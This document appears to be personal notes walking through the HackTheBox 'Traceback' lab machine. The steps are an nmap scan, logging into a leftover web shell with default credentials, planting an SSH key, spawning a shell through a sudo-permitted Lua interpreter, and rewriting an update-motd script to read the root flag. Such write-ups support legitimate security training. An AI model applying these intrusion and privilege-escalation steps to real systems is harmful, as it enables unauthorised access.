---
attachments: [traceback-port80.png]
title: HackTheBox - Traceback Notes
created: '2020-05-21T10:59:22.213Z'
modified: '2020-05-21T11:20:08.836Z'
---

# HackTheBox - Traceback Notes

Machine IP: `10.10.10.181` 


## Nmap Scan

```
# Nmap 7.80 scan initiated Thu May 21 13:05:58 2020 as: nmap -A -p22,80 -oN initial.nmap 10.10.10.181
Nmap scan report for 10.10.10.181
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%), Android 4.2.2 (Linux 3.4) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   206.01 ms 10.10.14.1
2   206.29 ms 10.10.10.181

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 21 13:06:22 2020 -- 1 IP address (1 host up) scanned in 25.55 seconds

```

## Initial Foothold

Opening http://10.10.10.181 (port 80) gives us a defaced page.

![Image](/root/Documents/notes/traceback-port80.png)

The HTML comment says `Some of the best web shells that you might need ;)`

Google the HTML comment and first result will be of a repository containing many web shells, appending all PHP file names gives us result that smevk.php has been used to deface, to login to the webshell (smevk.php),credentials `admin:admin` will work.

There are two users.
1. webadmin
2. sysadmin

Add your SSH key to /home/webadmin/.ssh/ as authorized_keys and login via SSH.

## Horizontal PrivEsc

Use `sudo -l` to check sudo permissions.

```
User webadmin may run the following commands on traceback: 
(sysadmin) NOPASSWD: /home/sysadmin/luvit
```

/home/webadmin/note.txt says

```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

The `luvit` file in sysadmin's home directory is a lua script.

Run it and execute following command to get shell of sysadmin

`os.execute("/bin/bash -i")`

## PrivEsc to Root

Using LinPeas tells us that /etc/update-motd.d is writable by sysadmin.

Run `echo "cat /root/root.txt" > /etc/update-motd.d/00-header`
Exit out of the shell and SSH again.

The startup message will have the root flag as 00-header is responsible for running those commands when a new login appears.
